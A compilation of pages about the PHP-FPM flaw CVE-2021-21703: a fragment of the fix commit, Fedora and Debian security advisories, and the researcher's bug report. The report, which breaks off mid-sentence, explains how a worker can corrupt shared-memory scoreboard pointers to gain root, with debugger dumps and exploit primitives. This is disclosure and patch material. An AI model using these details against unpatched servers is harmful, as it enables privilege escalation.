|  |  | if (!test) { |
|  |  | len2 = snprintf(b, FPM\_LOG\_BUFFER - len, "%lu", proc.duration.tv\_sec \* 1000000UL + proc.duration.tv\_usec); |
|  |  | len2 = snprintf(b, FPM\_LOG\_BUFFER - len, "%lu", (unsigned long)(proc.duration.tv\_sec \* 1000000UL + proc.duration.tv\_usec)); |
|  |  | } |
|  |  |  |
|  |  | } else { |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `f71810f`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Ff71810fb6f98251ace18ba49bc269d19ab27579a) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from lists.fedoraproject.org_b4f90070_20250114_195333.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/PBM3KKB3RY2YPOKNMC4HIH7IH3T3WC74/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/PBM3KKB3RY2YPOKNMC4HIH7IH3T3WC74/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/PBM3KKB3RY2YPOKNMC4HIH7IH3T3WC74/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/PBM3KKB3RY2YPOKNMC4HIH7IH3T3WC74/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-PBM3KKB3RY2YPOKNMC4HIH7IH3T3WC74.mbox.gz?message=PBM3KKB3RY2YPOKNMC4HIH7IH3T3WC74 "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/PBM3KKB3RY2YPOKNMC4HIH7IH3T3WC74/#PBM3KKB3RY2YPOKNMC4HIH7IH3T3WC74)

# [SECURITY] Fedora 33 Update: php-7.4.25-1.fc33

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

28 Oct
2021

28 Oct
'21

3:31 p.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2021-4140b54de2
2021-10-28 19:30:48.376993
--------------------------------------------------------------------------------

Name : php
Product : Fedora 33
Version : 7.4.25
Release : 1.fc33
URL : <http://www.php.net/>
Summary : PHP scripting language for creating dynamic web sites
Description :
PHP is an HTML-embedded scripting language. PHP attempts to make it
easy for developers to write dynamically generated web pages. PHP also
offers built-in database integration for several commercial and
non-commercial database management systems, so writing a
database-enabled webpage with PHP is fairly simple. The most common
use of PHP coding is probably as a replacement for CGI scripts.

--------------------------------------------------------------------------------
Update Information:

\*\*PHP version 7.4.25\*\* (21 Oct 2021) \*\*DOM:\*\* \* Fixed bug php#81433
(DOMElement::setIdAttribute() called twice may remove ID). (Viktor Volkov)
\*\*FFI:\*\* \* Fixed bug php#79576 ("TYPE \*" shows unhelpful message when type is
not defined). (Dmitry) \*\*Fileinfo:\*\* \* Fixed bug php#78987 (High memory usage
during encoding detection). (Anatol) \*\*Filter:\*\* \* Fixed bug php#61700
(FILTER\_FLAG\_IPV6/FILTER\_FLAG\_NO\_PRIV|RES\_RANGE failing). (cmb, Nikita)
\*\*FPM:\*\* \* Fixed bug php#81026 (PHP-FPM oob R/W in root process leading to
privilege escalation) (\*\*CVE-2021-21703\*\*). (Jakub Zelenka) \*\*SPL:\*\* \* Fixed
bug php#80663 (Recursive SplFixedArray::setSize() may cause double-free). (cmb,
Nikita, Tyson Andre) \*\*Streams:\*\* \* Fixed bug php#81475 (stream\_isatty emits
warning with attached stream wrapper). (cmb) \*\*XML:\*\* \* Fixed bug php#70962
(XML\_OPTION\_SKIP\_WHITE strips embedded whitespace). (Aliaksandr Bystry, cmb)
--------------------------------------------------------------------------------
ChangeLog:

\* Wed Oct 20 2021 Remi Collet remi@remirepo.net - 7.4.25-1
- Update to 7.4.25 - <http://www.php.net/releases/7_4_24.php>
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #2016535 - CVE-2021-21703 php: Local privilege escalation via PHP-FPM
<https://bugzilla.redhat.com/show_bug.cgi?id=2016535>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2021-4140b54de2' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/PBM3KKB3RY2YPOKNMC4HIH7IH3T3WC74/#PBM3KKB3RY2YPOKNMC4HIH7IH3T3WC74)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from lists.debian.org_2bd70db1_20250114_195330.html ===


---

[[Date Prev](msg00020.html)][[Date Next](msg00022.html)]
[[Thread Prev](msg00020.html)][[Thread Next](msg00022.html)]
[[Date Index](maillist.html#00021)]
[[Thread Index](threads.html#00021)]

# [SECURITY] [DLA 2794-1] php7.0 security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 2794-1] php7.0 security update
* *From*: Sylvain Beucler <beuc@beuc.net>
* *Date*: Wed, 27 Oct 2021 12:46:54 +0200
* *Message-id*: <[[🔎]](/msgid-search/20211027104654.GA19341%40mail.beuc.net) [20211027104654.GA19341@mail.beuc.net](msg00021.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian LTS Advisory DLA-2794-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                      Sylvain Beucler
October 27, 2021                              <https://wiki.debian.org/LTS>
- -------------------------------------------------------------------------

Package        : php7.0
Version        : 7.0.33-0+deb9u12
CVE ID         : CVE-2021-21703
Debian Bug     : 997003

An out-of-bounds read and write flaw was discovered in the PHP-FPM code,
which could result in escalation of privileges from local unprivileged
user to the root user.

For Debian 9 stretch, this problem has been fixed in version
7.0.33-0+deb9u12.

We recommend that you upgrade your php7.0 packages.

For the detailed security status of php7.0 please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/php7.0>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEE1vEOfV7HXWKqBieIDTl9HeUlXjAFAmF5LdoACgkQDTl9HeUl
XjB0zg/8DjOW1TMljqJdXr0q56ZPsAMajHHk1bawjY74ppSEjlNX4Fg/wUwe/NMM
mksqcKRAZDZ42pBt4S4tBQCd2nBzPTkSKVU1ZgsYeIjtBHcdzo8KTV/pNEAUe/ZU
zGi81OviALt3iENpBbOPxzIJSnA4beYG51hLomxGHFGoEAXwwuU4ZgIKmtEvg7El
RNyz8U75YyHo0g40ar8JQj2EHdjbr62mB3z2f0T6IMzFLPPuzrZqYMgA/ljacthY
R2nP908EKFy3HVeOxVqBEuXxeU93X/GqAY8E/bJLpzbD/r5Cz7MO+uTMjCzQ4xa+
3HVo1whjPRT/loYrzlBjHAMhQASQ5L4rVy1TkIffLFEEIGXnHe1iFlzbtC7kG/QZ
Jp4oikGYZgClrMOqNl9VkQGWhaQk0ikAfk8OZjrLvh/mJ6ymg06JJPAZLExLNkRO
gPOwTqBehGZSCJZSpVdMfdKGGEQIRb2P6IDvP1c/XZM3G9FBCp31A3MlAgz60gWI
dtmYC+NgC44O1V1rcw8bnl9IjNPwvqbLg62hkSt68/nrAFwh7mlFeNdpVIoDxGQL
TMMjuzeCYAqbIiOrd6yZLlTEHcNsfHEKnwxFDAJeNtJpXiJ2Nd+s39oUhKCeVZQY
OMvpepRJyjbXnKEgsL6TZ9bBJurVTWytPsZ+XSXdXd0VXdXW19Q=
=jgHy
-----END PGP SIGNATURE-----

```

---



=== Content from bugs.php.net_32d1a14a_20250114_195329.html ===


| [Bugs](/) | [php.net](https://php.net/) |  [support](https://php.net/support.php) |  [documentation](https://php.net/docs.php) |  [report a bug](report.php) |  [advanced search](search.php) |  [search howto](search-howto.php) |  [statistics](stats.php) |  [random bug](random) |  [login](login.php) |
| --- | --- |
| go to bug id or search bugs for | |

| | [Sec Bug](bug.php?id=81026) #81026 | PHP-FPM oob R/W in root process leading to privilege escalation | | | | | | --- | --- | --- | --- | --- | --- | | Submitted: | 2021-05-10 09:16 UTC | Modified: | 2021-10-26 11:42 UTC |  | | From: | c dot fol at ambionics dot io | Assigned: | [bukka](search.php?cmd=display&assign=bukka) ([profile](https://people.php.net/bukka)) | | Status: | Closed | Package: | [FPM related](search.php?cmd=display&package_name[]=FPM+related) | | PHP Version: | 8.0.6 | OS: |  | | Private report: | No | CVE-ID: | [2021-21703](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21703) |   View [Developer](bug.php?id=81026&edit=1) [Edit](bug.php?id=81026&edit=2)   **[2021-05-10 09:16 UTC] c dot fol at ambionics dot io** ``` Description: ------------ Hello,  # Bug  TL;DR: You can force the root FPM process to read/write at arbitrary locations using pointers located in the SHM, leading to a privilege escalation from www-data to root.  In PHP-FPM, each worker has an associated scoreboard (`fpm_scoreboard_proc_s`) structure, which contains a PID, its current state (is it handling a request or idle ? Which PHP file is it processing ?), and a few stats alongside (memory and CPU time used). Since both the main process and the worker itself need to read and write this structure, it resides in a shared memory mapping. The main process controls a `fpm_scoreboard_s` structure, also located in the SHM. It contains the number of active workers, and an array of pointers to `fpm_scoreboard_proc_s` structures.  Here's an example of `fpm_scoreboard_s` and `fpm_scoreboard_proc_s`:  ```cpp pwndbg> p fpm_worker_all_pools->scoreboard $6 = (struct fpm_scoreboard_s *) 0x7ff114945000 pwndbg> xi 0x7ff114945000 Extended information for virtual address 0x7ff114945000:    Containing mapping:     0x7ff114945000     0x7ff114947000 rw-p     2000 0      /dev/zero (deleted)    Offset information:          Mapped Area 0x7ff114945000 = 0x7ff114945000 + 0x0          File (Base) 0x7ff114945000 = 0x7ff109a31000 + 0xaf14000 pwndbg> p *fpm_worker_all_pools->scoreboard // fpm_scoreboard_s $7 = {   {     lock = 0,     dummy = '\000' <repeats 15 times>   },   pool = "www", '\000' <repeats 28 times>,   pm = 2,   start_epoch = 1619077029,   idle = 2,   active = 0,   active_max = 0,   requests = 0,   max_children_reached = 0,   lq = 0,   lq_max = 0,   lq_len = 0,   nprocs = 5, // Array size   free_proc = 2,   slow_rq = 0,   procs = 0x7ff114945078 // fpm_scoreboard_proc_s*[] } pwndbg> p *fpm_worker_all_pools->scoreboard->procs[0] // fpm_scoreboard_proc_s $8 = {   {     lock = 0,     dummy = '\000' <repeats 15 times>   },   used = 1,   start_epoch = 1619077029,   pid = 1444,   requests = 0,   request_stage = FPM_REQUEST_ACCEPTING,   ...   request_uri = '\000' <repeats 127 times>,   query_string = '\000' <repeats 511 times>,   request_method = '\000' <repeats 15 times>,   ... } ```  As you can see, scoreboard->procs is an array of pointers. Since it is located in the SHM, it can be read/modified by PHP-FPM workers. Since the root process also uses this pointers, this can lead to privilege escalation.  *As a quick test, you can set these pointers to `0xAABBCCDDEE` from a worker process and watch PHP-FPM's main process crash while trying to spawn a new one.*  # Exploit primitives  What does the main process do with these `scoreboard->procs` pointers ? When a worker dies, its scoreboard proc will be marked as unused by the main process using `fpm_scoreboard_proc_free()`. When a new one spawns, `fpm_scoreboard_proc_alloc()` will be used to "link" the new worker to an unused scoreboard.  Let's check `fpm_scoreboard_proc_free()` first: the dying process' PID has been previously obtained by the worker shutdown procedure, and from this a `child_index` has been obtained. It is the index of the dead worker's scoreboard structure in the `scoreboard->procs` array. If this structure's `used` flag is set, it is zeroed: 1168 bytes are set to zero.  When a worker spawns, it needs a `fpm_scoreboard_proc_s` structure. `fpm_scoreboard_proc_alloc()` iterates over `scoreboard->procs` and find an unused structure (by checking that the `used` field is *zero*), and mark it as used. This will effectively change a `0` int to a `1`.  These are really bad primitives but this is enough to get a privilege escalation. I can get into more details if you need to, and/or provide an exploit.  # Fix  I might be very wrong, but I have a few ideas since I've read this code a lot.  1. Get rid of pointers  Maybe you could change `scoreboard->procs` to be an array of `fpm_scoreboard_proc_s` instead of a an array of pointers ? Since the array access index is properly checked (for instance in `fpm_scoreboard_proc_free`, child_index is bound-checked), this would prevent the edition of pointers. No pointers no problems.  2. Get rid of scoreboard->nprocs  You always allocate wp->config->pm_max_children scoreboard procs (that is, scoreboard->nprocs == wp->config->pm_max_children). I don't believe workers need to access nprocs. Even if they did, they can't be able to change it. Otherwise, a worker can set it to a huge value and when the main process tries to go through the ->procs array, it will read OOB and crash.   Test script: --------------- You can use a PHP sandbox escape exploit to get arbitrary R/W in a worker's memory. Since we don't have this, let's just use GDB to "emulate" this (you need 